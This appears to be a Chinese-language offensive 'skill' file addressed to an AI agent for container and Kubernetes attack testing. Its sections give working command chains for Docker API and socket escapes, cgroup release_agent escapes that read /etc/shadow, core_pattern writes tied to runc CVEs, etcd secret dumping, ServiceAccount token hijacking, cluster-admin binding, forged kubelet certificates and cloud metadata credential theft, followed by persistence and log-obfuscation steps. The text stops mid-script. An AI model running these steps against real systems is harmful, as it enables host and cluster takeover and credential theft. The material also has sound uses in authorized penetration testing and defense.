---
name: container-security-testing
description: 容器安全深度攻防测试专业技能（v3.0高级版）：Docker/K8s全攻击面覆盖、2025-2026最新容器逃逸CVE深度利用（runc/containerd/kernel面）、K8s完整攻击链（API Server未授权→RBAC提权→kubelet exec→集群接管→云凭据）、镜像供应链深度攻击（注册表投毒/镜像层后门/签名绕过，联动ci-cd-attack-testing）、eBPF攻击面与检测规避、服务网格/网络策略绕过、云原生AI攻击面（GPU容器/Ollama/向量库/推理服务器）、AI大模型结合攻防（LLM辅助K8s配置审计与攻击路径规划）、从镜像审计到宿主机与云账号接管的完整攻击链
metadata:
  version: 3.0.0
---

# 容器安全深度攻防测试技能

> **AI LOAD INSTRUCTION**: 容器与 K8s 攻击专家打法。按已知前提：Docker/K8s 基础架构概念。聚焦立足点收集→逃逸路径判定（socket/特权/内核/runc CVE）→K8s API 攻击链→RBAC 滥用→eBPF 面，逃逸成功后按 DECISION TREE 移交承接 skill。

## 概述

容器化是现代应用的基础架构，其安全模型建立在**共享内核**之上——容器与宿主机之间只有 namespaces/cgroups 的软隔离，没有虚拟化边界。因此，任何内核漏洞、运行时缺陷或过度权限配置，本质上都是容器逃逸的潜在路径。本技能以资深攻防专家视角，系统化覆盖**镜像供应链→构建/CI-CD→运行时→网络→编排层（K8s）→宿主机→云凭据**的全栈攻击链，从"单容器逃逸"升级到"集群接管 + 云账号接管"的完整 kill chain。

### 核心概念

- **容器 ≠ VM**：共享宿主机内核，`/proc`、`/sys`、设备、capabilities、syscall 都是攻击面；逃逸的本质是跨越 namespace/cgroup 边界触达宿主机内核态或文件系统
- **逃逸三要素**：命名空间隔离（PID/MNT/NET/UTS/IPC/USER/CGROUP）、Linux capabilities（CAP_SYS_ADMIN/CAP_SYS_PTRACE/CAP_NET_ADMIN 等危险 CAP）、内核攻击面（syscall/驱动/eBPF）
- **K8s 信任边界**：Pod 内 ServiceAccount Token → API Server 认证/授权 → RBAC 权限是集群内提权的核心杠杆；Node（kubelet）是集群与宿主机之间的桥头堡
- **默认信任是最大的漏洞**：K8s 默认扁平网络（任意 Pod 互通）、默认挂载 SA Token、默认允许 root 运行，这些"默认"就是攻击路径
- **攻击链分层**：镜像投毒（供应链）→ 应用漏洞（入口）→ 容器逃逸（隔离突破）→ 节点沦陷（kubelet 凭据）→ 集群接管（RBAC/SA Token）→ 云凭据（元数据服务/IRSA/Workload Identity）

### 2025-2026 威胁态势（时效情报）

- **runc 逃逸三连**：CVE-2025-31133 / CVE-2025-52565 / CVE-2025-52881（2025-11 披露，2026-06 确认在野利用），影响 runc 1.0.0-rc3 起全部版本，`core_pattern` 内核 upcall 提权 → 宿主 root
- **nodes/proxy GET → 集群 RCE**：2026-01 披露（Won't Fix），监控组件普遍持有的 `nodes/proxy GET` 权限经 WebSocket 绕过 CREATE 检查直达 kubelet `/exec`，69 个 Helm Chart 受影响
- **镜像供应链投毒进入"安全工具自身被投毒"时代**：aquasec/trivy 官方镜像 0.69.4~0.69.6 被投毒（2026-03），窃取 CI/CD secrets 与云凭据
- **AI 基础设施裸奔**：全球约 17.5 万 Ollama 实例公网暴露（2026-early），91% 无认证；推理服务器（vLLM/LMDeploy/Triton/SGLang）成为新攻击面，LMDeploy CVE-2026-33626 披露 12 小时内被武器化
- **K8s 攻击面向配置组件集中**：ingress-nginx 配置注入系列 CVE 持续（CVE-2025-1974 / CVE-2026-3288 / CVE-2026-24512 等），Admission Controller 成为 RCE 跳板

## 一、镜像安全深度审计与供应链攻击

### 1.1 镜像层分析与漏洞扫描

```bash
# 镜像解包与逐层分析
docker save target:latest -o image.tar
tar -xf image.tar
# 逐层检查：manifest.json 列出 layer 顺序，逐层解包对比文件系统变更

# 漏洞扫描（多引擎交叉验证）
trivy image --severity HIGH,CRITICAL target:latest
trivy image --ignore-unfixed target:latest       # 只看有修复的
grype target:latest
docker scout cves target:latest                  # Docker 官方

# 敏感信息检测
docker history --no-trunc target:latest           # 查看每一层 RUN 指令（泄露密钥常见来源）
dive target:latest                                # 交互式逐层分析
trivy image --scanners secret,config target:latest  # 内置 secret 扫描

# 软件物料清单（SBOM）——供应链审计基线
syft target:latest -o spdx-json > sbom.json
trivy sbom sbom.json
```

### 1.2 Dockerfile 安全审计要点

```dockerfile
# 高风险模式（逐一核查）：
# 1. FROM 使用 root 基础镜像或 latest 浮动标签（不可复现）
# 2. ADD 远程 URL/自动解压（本地 tar 覆盖风险）
# 3. RUN 链式 && 中间残留密钥（多阶段构建清理）
# 4. 缺少 USER 非 root 指令（容器内 root = 逃逸放大器）
# 5. ENV/ARG 硬编码凭据（AK/SK、DB 密码、token）
# 6. 无 HEALTHCHECK/无 readOnlyRootFilesystem
# 7. .dockerignore 缺失（.env/.git/.ssh 被打进镜像）

# 静态审计工具
hadolint Dockerfile          # Dockerfile lint
dockle target:latest         # 容器镜像 CI 审计（CIS Docker Benchmark）
checkov -d .                 # IaC 安全扫描（含 Dockerfile/K8s Manifest/Helm）
```

### 1.3 镜像供应链攻击深度（联动 ci-cd-attack-testing）

```
攻击面全景：
1. 基础镜像投毒（Docker Hub 恶意/仿冒镜像，冒充 MySQL/Redis/Gradle 等）
2. 依赖包漏洞与依赖混淆（npm/pypi 同形字包名劫持）
3. 构建环境泄露（CI 流水线 secrets、.env、云端凭据被嵌入镜像层）
4. Dockerfile 注入（恶意 RUN 指令，如 cryptominer entrypoint）
5. Registry 未认证 push（获取目标仓库写权限后直接覆盖 tag）
6. 签名绕过（Notary/Cosign 校验缺失或 DCT 层篡改）
7. CI/CD 管道投毒（恶意构建阶段/依赖源替换/上游镜像 tag 漂移）
8. 安全工具自身被投毒（2026-03 aquasec/trivy 镜像事件：0.69.4~0.69.6/latest 被植入 infostealer，
   窃取 ~/.docker/config.json、云凭据、SSH key、CI/CD secrets；扫描器常挂载 docker.sock → 整机沦陷）
```

**镜像层后门——gh0stEdit（2025 披露）：**
利用 Docker 镜像分层/共享层机制，恶意篡改镜像层数据，**不改变镜像 history、层级结构**，且对 DCT 签名镜像**签名不失效**，静态/动态扫描工具均无法检出：

```bash
# 攻击思路（概念，授权测试用）：
# 1. 分析目标镜像 manifest，定位可篡改的共享 layer blob
# 2. 直接改写 layer 内文件（如 /etc/ld.so.preload、bashrc、entrypoint）但不触发重新提交
# 3. 保持 manifest/history 不变 → 签名校验通过 → 扫描器无感
# 防御：镜像准入校验须基于 digest（imagePullPolicy: Always + digest 引用）并做运行时基线对比
```

**供应链投毒检测命令：**
```bash
# 检查本地镜像是否命中已知被投毒 digest（Trivy 事件）
docker images --digests | grep -i trivy
# 已知恶意 digest（示例）：sha256:27f446230c60bbf0b70e008db798bd4f33b7826f9f76f756606f5417100beef3

# 校验镜像摘要而不是 tag（防 tag 漂移）
docker pull target:0.69.3@sha256:<digest>

# 检查镜像内是否有可疑的 entrypoint / 自动启动脚本
docker inspect target:latest --format '{{json .Config.Entrypoint}}'
docker run --rm --entrypoint cat target:latest /entrypoint.sh
```

### 1.4 签名验证与绕过

```bash
# Cosign 签名/验证
cosign sign --key cosign.key target:latest
cosign verify --key cosign.pub target:latest

# 绕过场景：
# - 集群未配置 ImagePolicyWebhook / Kyverno 校验 → 签名形同虚设
# - 签名只覆盖 manifest 不覆盖 blob → gh0stEdit 式层篡改
# - 使用 proxy-cache 镜像仓库时签名链断裂被绕过
# 测试：修改镜像层重新 push 同 tag，验证目标集群是否仍拉取

# K8s 侧强制（防御参考）
# Kyverno ClusterPolicy: verifyImageSignatures / ImageValidatingPolicy
```

## 二、Docker Daemon 与 API 攻击面

### 2.1 Docker Remote API 未授权（2375/2376）

```bash
# 未授权探测
curl -s http://target:2375/version
curl -s http://target:2375/containers/json
curl -s http://target:2375/info | jq '.Containers, .Images, .DockerRootDir'

# 创建特权容器接管宿主机（经典 Payload）
curl -X POST http://target:2375/containers/create -H "Content-Type: application/json" -d '{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh"],
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/host"],
    "NetworkMode": "host",
    "PidMode": "host"
  }
}'
# 获取容器 ID 后 start + exec
curl -X POST http://target:2375/containers/{id}/start
curl -X POST http://target:2375/containers/{id}/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"Cmd":["/bin/sh","-c","chroot /host /bin/sh -c \"id; cat /etc/shadow\""]}'

# 加密 TLS 但证书泄露/复用（2376）
openssl s_client -connect target:2376 2>/dev/null | openssl x509 -noout -subject -issuer
```

### 2.2 Docker Socket 暴露

```bash
# 容器内探测
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null

# 直接调用宿主机 Docker（无 docker CLI 时用 curl）
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/create -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host sh -c \"id > /tmp/pwned\""],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'

# 经典逃逸：sock → 特权容器 → chroot 宿主机
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host --net=host \
  -v /:/mnt alpine chroot /mnt
```

### 2.3 BuildKit / 构建阶段攻击面

```bash
# BuildKit 会话未授权（如 CI 暴露 buildkitd socket）
# docker buildx 默认复用 daemon 权限，CI 中 buildkit 容器常以特权运行 → 构建步骤即宿主机命令执行
# 测试：构建阶段 RUN 指令可写 /proc/sysrq-trigger、加载内核模块（配合逃逸 CVE）

# 挂载 docker.sock 进 buildkit/kaniko 场景 → 镜像构建即逃逸
# 防御参考：rootless buildkit、禁止 privileged、构建网络隔离（联动 ci-cd-attack-testing）
```

## 三、容器逃逸技术全景

### 3.1 逃逸路径矩阵

| 逃逸方式 | 前提条件 | 影响 | 复杂度 | 检测规避难度 |
|---------|---------|------|-------|------------|
| 特权容器 | `--privileged` | 完全逃逸（宿主机 root） | 低 | 低 |
| Docker Socket 挂载 | `/var/run/docker.sock` | 完全逃逸 | 低 | 低 |
| 宿主机 PID | `--pid=host` | nsenter 逃逸 | 低 | 低 |
| 宿主机网络 | `--net=host` | 网络层逃逸/旁路 | 低 | 中 |
| 宿主机文件系统 | `-v /:/host` | 任意文件读写 | 低 | 低 |
| CAP_SYS_ADMIN | `--cap-add=SYS_ADMIN` | mount/cgroup 逃逸 | 中 | 中 |
| CAP_SYS_PTRACE | `--cap-add=SYS_PTRACE` | 进程注入/凭据窃取 | 中 | 中 |
| CAP_DAC_READ_SEARCH / CAP_SYS_MODULE / CAP_NET_ADMIN | 危险 CAP 组合 | 多种逃逸 | 中 | 中 |
| cgroup notify_on_release | v1 + 特权/cap | 逃逸 | 中 | 中 |
| user namespace 配置错误 | userns 映射缺陷 | rootless 逃逸 | 高 | 高 |
| 内核漏洞 | 特定 CVE（见第四章） | 内核级逃逸 | 高 | 高 |
| eBPF 滥用 | CAP_BPF/CAP_SYS_ADMIN + bpf syscall | 跨容器/逃逸/rootkit（见第九章） | 高 | **极高** |

### 3.2 逃逸前置侦察（容器内信息收集）

```bash
# 判断是否在容器中
cat /proc/1/cgroup | head -5        # 含 /docker/ /kubepods/ 前缀 = 容器内
ls -la /.dockerenv 2>/dev/null

# capabilities 检查
capsh --print
grep Cap /proc/self/status
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')

# 危险挂载检查
mount | grep -E "(docker.sock|/etc/hosts|overlay|host)"
ls -la /var/run/docker.sock /run/containerd/containerd.sock /run/docker.sock 2>/dev/null
find / -maxdepth 3 -name "*.sock" 2>/dev/null

# 设备访问
ls -la /dev/ | head -30             # 出现宿主机磁盘 sda/vda = 特权
cat /proc/self/status | grep Seccomp

# 内核版本（决定可用的逃逸 CVE）
uname -r
```

### 3.3 特权容器逃逸

```bash
# 直接挂载宿主机磁盘
ls /dev/sda1 /dev/vda1 /dev/nvme0n1p1 2>/dev/null
mkdir -p /mnt && mount /dev/sda1 /mnt 2>/dev/null && chroot /mnt /bin/bash

# cgroup v1 notify_on_release 逃逸
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
cat /output

# 特权容器 + nsenter（宿主机 PID 可见时）
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### 3.4 CAP_SYS_ADMIN 逃逸（mount + userns）

```bash
# 判断 user namespace 可用
unshare -Urm true && echo "userns OK" || echo "userns denied"

# 利用 mount + pivot_root 逃逸（CAP_SYS_ADMIN + 可写挂载点）
mkdir -p /tmp/x
unshare -m --propagation slave true
mount -t proc proc /proc
# 进阶：挂载宿主 overlay 上层目录/利用 release_agent（见 3.3）

# CAP_SYS_ADMIN 但非特权容器时的核心思路：
# 1. 确认 CapEff 含 cap_sys_admin
# 2. 尝试 mount 宿主设备/目录（/etc/hosts 指向宿主文件时挂载覆盖）
# 3. 利用 cgroup v1 + release_agent（前提：能挂载 cgroup）
```

### 3.5 其他危险 CAP 利用

```bash
# CAP_SYS_PTRACE → 进程注入（若可见宿主进程）
# 利用 gdb/自定义 ptrace 读取 /proc/1/mem 提取宿主进程内存中的凭据

# CAP_SYS_MODULE → 直接加载恶意内核模块（= 内核级 rootkit/完全控制）
# CAP_DAC_READ_SEARCH → 绕过文件读权限遍历宿主文件系统
# CAP_NET_ADMIN → iptables 劫持流量、tcpdump 嗅探、修改网络栈

# 综合工具：CDK / amicontained / deepce
amicontained            # 输出容器拥有的 capabilities 与逃逸可行性
CDK evaluate            # 容器渗透评估
deepce --auto           # 自动检测可逃逸配置
```

### 3.6 命名空间隔离绕过（基础面）

```
1. PID namespace：--pid=host 时容器可见全部宿主进程 → nsenter/信号注入
2. Network namespace：--net=host 时共享宿主网络栈 → 嗅探/旁路防火墙
3. Mount namespace：错误挂载（-v /、/etc/hosts、/proc）→ 直接读写宿主文件
4. IPC namespace：--ipc=host → 读取宿主共享内存/信号量中的凭据
5. UTS namespace：--uts=host → 影响宿主机 hostname（低危）
6. User namespace：映射缺陷（uid 0 映射到宿主非特权用户）→ rootless 逃逸探索
```

## 四、2025-2026 最新容器逃逸 CVE 深度利用

### 4.1 runc 逃逸系列（2025-2026 重点）

**CVE-2024-21626（Leaky Vessels，2024-01）：**
runc 工作目录文件描述符泄露，恶意镜像可在容器 rootfs 建立前通过 `/proc/self/fd/<fd>` 穿越到宿主机文件系统写入：

```bash
# 利用形态：镜像 ENTRYPOINT 内直接引用泄漏的 fd
# 在镜像构建阶段执行（示例）：
cat > /proc/self/fd/<leaked_fd>/tmp/pwned << 'EOF'
#!/bin/sh
id > /host_pwned
EOF
```

**CVE-2025-31133（CVSS 7.3）—— masked paths 绕过：**
runc 未校验容器内 `/dev/null` 是否为真实 inode，攻击者用符号链接替换为任意宿主路径，runc 随后将其 bind-mount 为容器内读写 → 可写 `/proc/sysrq-trigger`（DoS）或配合 **core_pattern 内核 upcall** 实现提权逃逸（`/proc/sys/kernel/core_pattern` 指向攻击者程序，崩溃时内核以宿主 root 执行）：

```bash
# 概念利用链：
# 1. 恶意镜像/容器在 mount 阶段将 /dev/null 替换为指向 /proc/sys/kernel/core_pattern 的符号链接
# 2. runc bind-mount 该路径为读写 → 容器内写入 core_pattern 为宿主路径
# 3. 触发任意进程崩溃 → 内核以完整 root 权限执行 upcall 程序 → 逃逸
echo -e "|/tmp/exploit %p %s" > /proc/sys/kernel/core_pattern
```

**CVE-2025-52565——/dev/console 符号链接逃逸：**
runc 在 masked/readonly 路径应用**之前**将 `/dev/pts/$n` bind-mount 到 `/dev/console`，攻击者用符号链接重定向该挂载到任意目标（含 `/proc/sys/kernel/core_pattern`）→ 任意写 → 逃逸。

**CVE-2025-52881——共享挂载竞态写重定向：**
利用共享挂载容器间的竞态，将 runc 自身对 `/proc` 的写入（LSM label/sysctl）重定向到危险文件（`/proc/sysrq-trigger`、`core_pattern`），同时**可关闭 AppArmor 等 LSM 防护**，可与 CVE-2025-31133 串联。

**影响与修复版本：**
```
runc 受影响：<=1.2.7 / <=1.3.2 / <=1.4.0-rc.2
修复版本：  1.2.8 / 1.3.3 / 1.4.0-rc.3
containerd：1.6.39+ / 1.7.28-2+
风险面：恶意镜像、CI/CD 构建任意 build step、多租户共享集群
检测：runc --version；docker version | grep -i runc
```

### 4.2 containerd 面

```
- CVE-2020-15257：containerd shim API 暴露（--net=host 时可达宿主机 shim socket）→ 逃逸
- containerd snapshotter / namespace 混淆类漏洞：跨镜像/跨容器数据访问（2026 研究方向）
- CRI 层面：kubelet 以 root 管理 containerd → containerd 漏洞即节点 root
```

### 4.3 内核面（共享内核 = 逃逸面）

```bash
# 历史已知内核漏洞（逃逸常客）
# CVE-2022-0847 (DirtyPipe)   任意文件覆盖        Linux 5.8+
# CVE-2024-1086              nf_tables UAF        Linux 5.14-6.6
# CVE-2022-0492              cgroup 逃逸          Linux <5.16.11
# CVE-2023-0179 / CVE-2023-32233 等 nftables 提权
# CVE-2021-4034 (polkit)     本地提权（容器内 root 需宿主同版本） 

# 内核漏洞利用的容器化前提：
# - 容器内 root 即可（内核漏洞不依赖容器配置）
# - seccomp 默认 profile 可能拦截部分 exploit 用 syscall（先探测 Seccomp 状态）
# - 提权成功后是"宿主内核态"而非"容器内"→ 直接脱离 namespace 限制
```

### 4.4 逃逸后的宿主机接管六阶段链

```
逃逸 ≠ 终点。逃逸后标准动作（K8s 节点上尤其关键）：
Phase 1  确认脱离容器：cat /proc/1/cgroup（出现 /system.slice/kubelet.service 即宿主）
Phase 2  收割 kubelet 凭据：/var/lib/kubelet/pki/kubelet-client-current.pem（含私钥+证书，
         Subject: CN=system:node:<nodename>,O=system:nodes，可向 API Server 以节点身份认证）
         cat /var/lib/kubelet/kubeconfig（内含 API Server 地址与 CA）
Phase 3  用节点身份枚举集群：kubectl --kubeconfig 访问 secrets/pods（节点身份通常拥有 pods 读权限）
Phase 4  从同节点其他 Pod 进程环境变量/挂载提取 Secret/SA Token（/proc/*/environ）
Phase 5  云凭据：curl http://169.254.169.254/latest/meta-data/iam/security-credentials/（AWS）
         /latest/meta-data/iam/security-credentials/<role>
Phase 6  提权 cluster-admin：节点证书 + 逃逸 Pod 权限组合 → 创建特权 Pod → 偷取高权 SA Token
         → cluster-admin（完整链条 5 分钟内可完成）
```

## 五、Kubernetes 深度攻击链（API Server → 集群接管）

### 5.1 K8s 攻击面全景

| 攻击面 | 风险 | 测试方法 |
|--------|------|---------|
| API Server (6443) | 未授权/认证绕过/匿名访问 | curl 匿名探测 + `kubectl get` 无凭据尝试 |
| etcd (2379) | 全部集群数据（含 Secret）泄露 | 端口暴露检测 + etcdctl 未认证读取 |
| Kubelet (10250/10255) | 未认证 API / exec | `/pods` `/run` 匿名访问测试 |
| ServiceAccount Token | Pod 内自动挂载，权限滥用 | 容器内读 token → kubectl 测试 |
| RBAC | 过度授权（cluster-admin 泛滥） | `auth can-i --list` 审计 |
| NetworkPolicy | 默认全通 → 横向移动 | Pod 间连通性测试 |
| Admission Controller | 策略绕过（PSA/OPA/Kyverno 缺陷） | 特权 Pod 创建测试 |
| Ingress Controller | 配置注入 RCE / Secret 泄露 | ingress-nginx CVE 系列测试 |
| Dashboard | 未认证/弱认证 | 8001 端口探测 |
| Helm Tiller / 旧组件 | 遗留高危组件 | 组件指纹识别 |
| CSI 驱动 | 路径穿越删除/篡改数据 | CVE-2026-3864/3865 (NFS/SMB subDir) |
| 云集成 | IRSA/Workload Identity 过度授权 | SA annotation 审计 → 云 API 越权 |

### 5.2 API Server 未授权访问（集群接管起点）

```bash
# 匿名访问探测（system:anonymous 默认可访问部分端点）
curl -sk https://target:6443/api | head -5
curl -sk https://target:6443/api/v1/namespaces/default/pods   # 期望 403/401
curl -sk https://target:6443/version                          # 期望 200（公开端点）

# 匿名用户授权过大时直接列资源
curl -sk -H "Authorization: Bearer" https://target:6443/api/v1/secrets

# 权限绕过组合拳（匿名/弱凭据场景）
# - system:unauthenticated 组绑定过多 RBAC（审计 system:unauthenticated 相关 RoleBinding）
# - 老版本 <=1.19 匿名用户默认可读部分资源
# - 弱 admin token / 泄露的 kubeconfig / 控制平面服务账号滥用
```

### 5.3 etcd 未授权 → 直接接管

```bash
# etcd 2379 暴露探测（常因控制平面安全组配置错误暴露）
etcdctl --endpoints=https://etcd:2379 --insecure-skip-tls-verify get / --prefix --keys-only | head -50

# 读取全部 Secret（cluster-admin 级数据）
etcdctl --endpoints=https://etcd:2379 --insecure-skip-tls-verify \
  get /registry/secrets --prefix --keys-only

# 替换/伪造资源实现持久化（如篡改 serviceaccounts 或 rolebindings）
# 防御：etcd 需 TLS 客户端认证 + 网络隔离 + Secret 静态加密
```

### 5.4 完整攻击链：API Server 未授权 → 集群接管 → 逃逸 → 云凭据

```
攻击链（贯穿全技能的主线）：
① 初始访问（任一）：应用 RCE / 未授权 API / 镜像投毒 / Dashboard 弱口令
② 落地 Pod：应用漏洞 RCE → 写文件/反弹 Shell 进入容器
③ 容器内信息收集：SA Token、namespace、网络拓扑、可访问服务
④ RBAC 枚举：kubectl auth can-i --list（看是否 pods/create / pods/exec / secrets get / nodes/proxy）
⑤ 集群内提权：
   - 有 pods/create → 创建特权 Pod（hostPID/hostNetwork/hostPath=/）→ 见 6.1
   - 有 secrets get → 直接偷高权 SA Token
   - 有 nodes/proxy → kubelet /exec（见第七章）
   - 直接拿到高权 Token → cluster-admin
⑥ 容器逃逸：特权容器/CAP/CVE（第三、四章）
⑦ 节点沦陷：kubelet 客户端证书（/var/lib/kubelet/pki/）→ 节点身份认证 API
⑧ 云凭据：实例元数据服务 / IRSA / Workload Identity → S3/云 API 越权
⑨ 持久化 + 痕迹清理：恶意 Deployment/CronJob/DaemonSet + 审计日志混淆
```

### 5.5 ServiceAccount Token 利用

```bash
# 容器内提取
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
KUBE_SERVER=https://kubernetes.default.svc

# 用 Token 访问 API
kubectl --token=$TOKEN --server=$KUBE_SERVER --certificate-authority=$CA get pods -n $NS
kubectl --token=$TOKEN --server=$KUBE_SERVER --insecure-skip-tls-verify get pods -n kube-system

# 快速枚举当前身份权限（读操作，低告警）
kubectl auth can-i --list
kubectl auth can-i create pods --as=system:serviceaccount:$NS:default
kubectl auth can-i get secrets -n kube-system

# Token 结构解析（JWT）
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

## 六、RBAC 滥用与提权攻击路径

### 6.1 六大经典提权链（无 CVE，纯配置滥用）

```
链1  pods/create → 指定任意 SA：能创建 Pod 就能指定命名空间内任意 ServiceAccount
     （含绑定了 cluster-admin 的 deployer-sa/jenkins-sa）→ 偷取其 Token 即集群接管
链2  deployments/statefulsets patch → 篡改运行中工作负载的 SA/privileged 字段 → 提权
链3  secrets get → 直接读取 Secret 中的高权 Token/凭据（TokenReview 无法拦截已签发 Token）
链4  roles/rolebindings create → 给自己/恶意 SA 绑定 admin/cluster-admin
链5  pods/exec → 进入任意容器（含特权系统 Pod：kube-proxy/cilium-agent）→ 节点沦陷
链6  nodes/proxy GET → kubelet API（见第七章，WebSocket 绕过 → 全集群 RCE）
```

```bash
# 链1 实战：创建挂载高权 SA Token 的 Pod
# 先枚举高权 SA
kubectl get serviceaccounts -A
kubectl get clusterrolebindings -o json | jq -r '.items[] | 
  select(.roleRef.name=="cluster-admin") | .subjects[]? | "\(.namespace)/\(.name)"'

# 创建 Pod 使用目标 SA
kubectl -n <ns> apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: hijack-sa
  namespace: <ns>
spec:
  serviceAccountName: <high-priv-sa>
  automountServiceAccountToken: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/termination-log; sleep 3600"]
EOF
kubectl -n <ns> logs hijack-sa --tail=5   # 读出 Token

# 链4 实战：创建高权 RoleBinding
kubectl create clusterrolebinding pwn-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=<ns>:<my-sa>
```

### 6.2 RBAC 审计方法论

```bash
# 全面权限盘点
kubectl auth can-i --list -n <ns>
kubectl auth can-i --list                    # 集群范围
kubectl auth can-i get secrets -n kube-system
kubectl auth can-i create pods --all-namespaces

# 高危权限自动审计（工具）
kubeaudit all -f <deployment>.yaml
kubescape scan framework nsa,mitre
rbackup / kube-forensics            # RBAC 攻击路径枚举
cdk k8s-get-secrets / kdigger        # 容器内快速验证

# 高危 RBAC 特征速查
# - cluster-admin / system:masters 绑定到业务 SA
# - 通配符 resources: ["*"] verbs: ["*"]
# - secrets get/list/watch
# - pods/exec, pods/create, pods/attach
# - nodes/proxy（GET 都危险！）
# - impersonate（模拟权限 = 提权）
# - rolebindings/clusterrolebindings create/update
# - configmaps get（可读 kubeconfig 里的凭据）
# - system:unauthenticated 组绑定（匿名访问）
```

### 6.3 高危 RBAC 细节：impersonate 与 system:masters

```bash
# impersonate 提权：拥有 impersonate 权限可模拟任意用户/组/SA
kubectl --as=system:serviceaccount:kube-system:admin get secrets -n kube-system
kubectl --as=system:masters get nodes        # system:masters 组绕过全部 RBAC

# 检测
kubectl get clusterroles -o json | jq -r '.items[] | 
  select(.rules[].resources[]?=="users" and .rules[].verbs[]?=="impersonate") | .metadata.name'
```

## 七、Kubelet 攻击面与 nodes/proxy 深度利用

### 7.1 Kubelet 未认证/弱认证（10250/10255）

```bash
# 未认证探测（10250 是 HTTPS 认证端口，10255 是只读端口）
curl -sk https://node:10250/pods | head -50
curl -sk https://node:10250/metrics | head -5

# 10255 只读端口泄露容器列表/镜像
curl -s http://node:10255/pods

# kubelet /run 未认证执行（老版本/错误配置）
curl -sk -X POST https://node:10250/run/<ns>/<pod>/<container> -d "cmd=id"

# kubelet /exec（需要认证，认证方式见 7.3）
# WebSocket exec：curl -sk "https://node:10250/exec/<ns>/<pod>/<container>?command=id&stdin=1&stdout=1&stderr=1&tty=1" \
#   -H "Authorization: Bearer <token-or-client-cert>" --output - 

# 常见弱认证：kubelet 仅验证客户端证书存在（不校验 CA），
# 生成任意自签名证书 + CN=system:node:<任意节点名> 即可认证
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 \
  -subj "/CN=system:node:fake-node/O=system:nodes"
curl -sk --cert cert.pem --key key.pem https://node:10250/pods
```

### 7.2 nodes/proxy GET → 集群 RCE（2026 高危设计缺陷）

**原理**：`nodes/proxy` 是控制 Kubelet 全部端点的 catch-all 权限。监控组件（prometheus/grafana/promtail/datadog/cilium-spire 等 69 个 Helm Chart）普遍持有 `nodes/proxy GET`。而 Kubelet `/exec` 的授权检查只验证 WebSocket **握手时的 GET 请求**（RFC 6455 强制 GET），升级成功后**不再做 CREATE 检查** → 拥有 GET 权限即可在任意 Pod 执行命令（含 kube-system 特权系统 Pod）：

```bash
# 攻击前置检查：当前身份是否拥有 nodes/proxy
kubectl auth can-i get nodes/proxy --all-namespaces   # true = 可利用

# 利用链：
# 1. 枚举可达节点的 Pod（kubelet /pods）
curl -sk https://<node>:10250/pods -H "Authorization: Bearer $TOKEN" | jq -r '.items[].metadata.name'

# 2. 通过 API Server 代理或直连 kubelet 发起 WebSocket exec
#    (API Server 代理路径: /api/v1/nodes/<node>/proxy/exec/<ns>/<pod>/<container>)
# 3. 目标：kube-proxy / cilium-agent 等特权 Pod → root → 逃逸节点
# 4. 注意：该路径不记录审计日志（仅 subjectaccessreviews），比 pods/exec 更隐蔽

# 官方定性：Won't Fix（working as intended）
# 缓解：K8s v1.36+ KubeletFineGrainedAuthz（nodes/metrics、nodes/stats 等细粒度子资源，KEP-2862）；
#       最小化 nodes/proxy 授权；无法避免时用 ServiceAccount 监控 + 网络层限制 10250 可达性
```

### 7.3 Kubelet 凭据收割（节点逃逸后必做）

```bash
# 逃逸到节点后（见 4.4）：
# kubelet 客户端证书 = 节点身份，可认证 API Server
cat /var/lib/kubelet/pki/kubelet-client-current.pem      # 私钥+证书合一

# 构造 kubeconfig
kubectl --server=https://<apiserver>:6443 \
  --client-certificate=/var/lib/kubelet/pki/kubelet-client-current.pem \
  --client-key=/var/lib/kubelet/pki/kubelet-client-current.pem \
  --insecure-skip-tls-verify get pods -A

# 节点身份权限：通常可读写本节点 pods、获取节点上所有 Pod 的 SA Token 引用
# 进一步：创建特权 Pod 绑定到本节点（nodeName 指定）→ 偷其他 SA Token → 集群接管
```

## 八、K8s 横向移动、持久化与后渗透

### 8.1 横向移动技术

```
1. ServiceAccount Token 横向：窃取高权 SA → 访问其他 namespace 资源
2. 恶意 Pod/CronJob 横向：在目标 namespace 落地后门（伪装成业务镜像）
3. NetworkPolicy 缺失 → 任意 Pod 间互通 → 扫描内网服务（数据库/管理端）
4. NodePort/LoadBalancer 暴露内部服务（或攻击者自行暴露）
5. Secret/ConfigMap 收割：业务配置中的数据库密码/API Key（大量真实案例）
6. Admission Webhook 劫持：有 webhook 配置权限时插入恶意 validating/mutating webhook
7. DNS 枚举：*.svc.cluster.local 服务发现 + SRV 记录探测
8. 节点间横向：node 逃逸后 kubelet 证书 → 其他节点 kubelet（10250 可达时）
```

```bash
# 集群内服务发现
nslookup -type=SRV _http._tcp.default.svc.cluster.local
# 扫描常见高价值服务端口（数据库/缓存/管理面板）
for ip in $(kubectl get pods -A -o wide | awk '{print $6}' | grep -E '^10\.'); do
